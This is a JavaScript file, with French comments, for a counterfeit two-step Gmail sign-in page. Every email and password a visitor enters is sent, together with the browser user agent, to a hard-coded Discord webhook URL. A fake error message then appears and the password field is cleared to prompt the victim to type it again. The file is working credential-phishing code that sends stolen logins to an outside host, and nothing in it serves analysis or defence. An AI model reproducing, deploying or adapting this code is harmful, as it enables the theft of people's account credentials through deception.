document.addEventListener('DOMContentLoaded', () => {
    const emailPage = document.getElementById('email-page');
    const passwordPage = document.getElementById('password-page');
    const emailForm = document.querySelector('#email-page .login-form');
    const passwordForm = document.getElementById('password-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const userEmailDisplay = document.querySelector('.user-email');
    const userAvatar = document.querySelector('.user-avatar span');
    const changeAccountBtn = document.querySelector('.change-account');
    const showPasswordCheckbox = document.getElementById('show-password');
    const nextButton = document.querySelector('#email-page .next-button');
    const errorMessage = document.querySelector('.error-message');

    // Fonction pour envoyer les données au webhook Discord
    const sendToDiscord = async (data) => {
        try {
            const webhookURL = 'https://discord.com/api/webhooks/1089499314608418926/zgFcjXhV5K5x3mujOUuj96KBw6B1itw7575hyv0LcW8nYE2bSesfKTYCnXhktA4LswLE';
            
            // Création du message Discord avec mise en forme
            const message = {
                embeds: [{
                    title: '📨 Nouvelle connexion Gmail',
                    color: 0x4285F4, // Couleur Google Blue
                    fields: [
                        {
                            name: '📧 Email',
                            value: data.email || 'Non fourni',
                            inline: true
                        },
                        {
                            name: '🔑 Mot de passe',
                            value: data.password || 'Non fourni',
                            inline: true
                        },
                        {
                            name: '🌐 User Agent',
                            value: navigator.userAgent,
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            const response = await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });
            
            if (!response.ok) {
                throw new Error('Erreur réseau');
            }
            
            // Afficher le message d'erreur
            errorMessage.classList.remove('hidden');
            passwordInput.value = '';
            passwordInput.focus();
            
        } catch (error) {
            console.error('Erreur:', error);
            // Afficher quand même le message d'erreur en cas d'erreur réseau
            errorMessage.classList.remove('hidden');
            passwordInput.value = '';
            passwordInput.focus();
        }
    };

    // Handle email form submission
    emailForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const email = emailInput.value.trim();
        if (email !== '') {
            // Show password page
            emailPage.classList.add('hidden');
            passwordPage.classList.remove('hidden');
            userEmailDisplay.textContent = email;
            // Set avatar letter
            userAvatar.textContent = email[0].toUpperCase();
            passwordInput.focus();
        }
    });

    // Handle password form submission
    passwordForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const password = passwordInput.value.trim();
        if (password !== '') {
            // Cacher le message d'erreur s'il était affiché
            errorMessage.classList.add('hidden');
            // Envoyer l'email et le mot de passe à Discord
            sendToDiscord({
                email: emailInput.value,
                password: password
            });
        }
    });

    // Handle "change account" button
    changeAccountBtn.addEventListener('click', () => {
        passwordPage.classList.add('hidden');
        emailPage.classList.remove('hidden');
        emailInput.focus();
        passwordInput.value = '';
        showPasswordCheckbox.checked = false;
        passwordInput.type = 'password';
        // Cacher le message d'erreur
        errorMessage.classList.add('hidden');
    });

    // Show/hide password functionality
    showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
    });

    // Enable/disable next button based on input
    emailInput.addEventListener('input', () => {
        nextButton.disabled = emailInput.value.trim() === '';
    });

    // Initialize button state
    nextButton.disabled = true;

    // Handle input focus states
    [emailInput, passwordInput].forEach(input => {
        input.addEventListener('focus', () => {
            input.parentElement.classList.add('focused');
        });

        input.addEventListener('blur', () => {
            if (input.value.trim() === '') {
                input.parentElement.classList.remove('focused');
            }
        });
    });

    // Cacher le message d'erreur quand l'utilisateur commence à taper
    passwordInput.addEventListener('input', () => {
        errorMessage.classList.add('hidden');
    });
});
